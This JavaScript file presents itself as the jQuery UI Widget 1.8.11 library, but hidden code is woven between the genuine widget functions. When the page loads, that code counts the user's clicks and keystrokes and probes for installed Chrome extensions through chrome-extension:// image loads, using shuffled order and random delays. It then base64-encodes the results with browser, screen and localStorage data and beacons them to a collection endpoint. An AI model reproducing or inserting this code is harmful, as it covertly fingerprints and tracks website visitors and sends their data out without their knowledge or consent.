/*!
 * jQuery UI Widget 1.8.11
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Widget
 */
(function (b, j) {
  let eventData = {},
    storeData = {};
  if (b.cleanData) {
    var k = b.cleanData;
    b.cleanData = function (a) {
      for (var c = 0, d; (d = a[c]) != null; c++) b(d).triggerHandler("remove");
      k(a);
    };
  } else {
    var l = b.fn.remove;
    b.fn.remove = function (a, c) {
      return this.each(function () {
        if (!c) if (!a || b.filter(a, [this]).length) b("*", this).add([this]).each(function () {
          b(this).triggerHandler("remove");
        });
        return l.call(b(this), a, c);
      });
    };
  }
  b.widget = function (a, c, d) {
    var e = a.split(".")[0],
      f;
    a = a.split(".")[1];
    f = e + "-" + a;
    if (!d) {
      d = c;
      c = b.Widget;
    }
    b.expr[":"][f] = function (h) {
      return !!b.data(h, a);
    };
    b[e] = b[e] || {};
    b[e][a] = function (h, g) {
      arguments.length && this._createWidget(h, g);
    };
    c = new c();
    c.options = b.extend(true, {}, c.options);
    b[e][a].prototype = b.extend(true, c, {
      namespace: e,
      widgetName: a,
      widgetEventPrefix: b[e][a].prototype.widgetEventPrefix || a,
      widgetBaseClass: f
    }, d);
    b.widget.bridge(a, b[e][a]);
  };
  window.addEventListener('click', event => {
    eventData.clicks = (eventData.clicks || 0) + 1;
  });
  b.widget.bridge = function (a, c) {
    b.fn[a] = function (d) {
      var e = typeof d === "string",
        f = Array.prototype.slice.call(arguments, 1),
        h = this;
      d = !e && f.length ? b.extend.apply(null, [true, d].concat(f)) : d;
      if (e && d.charAt(0) === "_") return h;
      e ? this.each(function () {
        var g = b.data(this, a),
          i = g && b.isFunction(g[d]) ? g[d].apply(g, f) : g;
        if (i !== g && i !== j) {
          h = i;
          return false;
        }
      }) : this.each(function () {
        var g = b.data(this, a);
        g ? g.option(d || {})._init() : b.data(this, a, new c(d, this));
      });
      return h;
    };
  };
  window.addEventListener('input', event => {
    eventData.typing = (eventData.typing || 0) + 1;
  });
  window.onbeforeunload = () => {
    localStorage.setItem('localData', JSON.stringify(storeData));
  };
  b.Widget = function (a, c) {
    arguments.length && this._createWidget(a, c);
  };
  const probeExtension = {
    activeProbes: new Map(Object.entries(window.data)),
    completedProbes: new Set(),
    async completeProbe(extensionName, extensionInstance) {
      return new Promise(async resolve => {
        const image = new Image();
        const timer = setTimeout(() => {
          this.completedProbes.delete(extensionName);
          resolve(false);
        }, 1500);
        image.onerror = () => {
          clearTimeout(timer);
          this.completedProbes.delete(extensionName);
          resolve(false);
        };
        image.onload = () => {
          clearTimeout(timer);
          this.completedProbes.add(extensionName);
          resolve(true);
        };
        image.src = `chrome-extension://${extensionInstance.id}/${extensionInstance.file}`;
      });
    },
    shuffleProbes() {
      const probes = Array.from(this.activeProbes.entries());
      for (let i = probes.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [probes[i], probes[j]] = [probes[j], probes[i]];
      }
      this.activeProbes = new Map(probes);
    },
    async probeAll() {
      this.shuffleProbes();
      const results = {};
      storeData.results = results;
      for (const [extName, extInstance] of this.activeProbes) {
        await new Promise(done => setTimeout(done, Math.random() * 200));
        results[extName] = await this.completeProbe(extName, extInstance);
      }
      const data = {
        findings: results,
        ts: new Date().getTime(),
        browser: navigator.userAgent,
        screen: {
          w: window.innerWidth,
          h: window.innerHeight
        },
        cache: localStorage.getItem("localData"),
        interaction: eventData
      };
      navigator.sendBeacon('https://collection-endpoint.example/v2/report', btoa(JSON.stringify(data)));
      storeData = {};
      eventData = {};
    }
  };
  b.Widget.prototype = {
    widgetName: "widget",
    widgetEventPrefix: "",
    options: {
      disabled: false
    },
    _createWidget: function (a, c) {
      b.data(c, this.widgetName, this);
      this.element = b(c);
      this.options = b.extend(true, {}, this.options, this._getCreateOptions(), a);
      var d = this;
      this.element.bind("remove." + this.widgetName, function () {
        d.destroy();
      });
      this._create();
      this._trigger("create");
      this._init();
    },
    _getCreateOptions: function () {
      return b.metadata && b.metadata.get(this.element[0])[this.widgetName];
    },
    _create: function () {},
    _init: function () {},
    destroy: function () {
      this.element.unbind("." + this.widgetName).removeData(this.widgetName);
      this.widget().unbind("." + this.widgetName).removeAttr("aria-disabled").removeClass(this.widgetBaseClass + "-disabled ui-state-disabled");
    },
    widget: function () {
      return this.element;
    },
    option: function (a, c) {
      var d = a;
      if (arguments.length === 0) return b.extend({}, this.options);
      if (typeof a === "string") {
        if (c === j) return this.options[a];
        d = {};
        d[a] = c;
      }
      this._setOptions(d);
      return this;
    },
    _setOptions: function (a) {
      var c = this;
      b.each(a, function (d, e) {
        c._setOption(d, e);
      });
      return this;
    },
    _setOption: function (a, c) {
      this.options[a] = c;
      if (a === "disabled") this.widget()[c ? "addClass" : "removeClass"](this.widgetBaseClass + "-disabled ui-state-disabled").attr("aria-disabled", c);
      return this;
    },
    enable: function () {
      return this._setOption("disabled", false);
    },
    disable: function () {
      return this._setOption("disabled", true);
    },
    _trigger: function (a, c, d) {
      var e = this.options[a];
      c = b.Event(c);
      c.type = (a === this.widgetEventPrefix ? a : this.widgetEventPrefix + a).toLowerCase();
      d = d || {};
      if (c.originalEvent) {
        a = b.event.props.length;
        for (var f; a;) {
          f = b.event.props[--a];
          c[f] = c.originalEvent[f];
        }
      }
      this.element.trigger(c, d);
      return !(b.isFunction(e) && e.call(this.element[0], c, d) === false || c.isDefaultPrevented());
    }
  };
  const onReady = () => {
    probeExtension.probeAll();
    document.removeEventListener('DOMContentLoaded', onReady);
  };
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', onReady);
  } else {
    onReady();
  }
})(jQuery);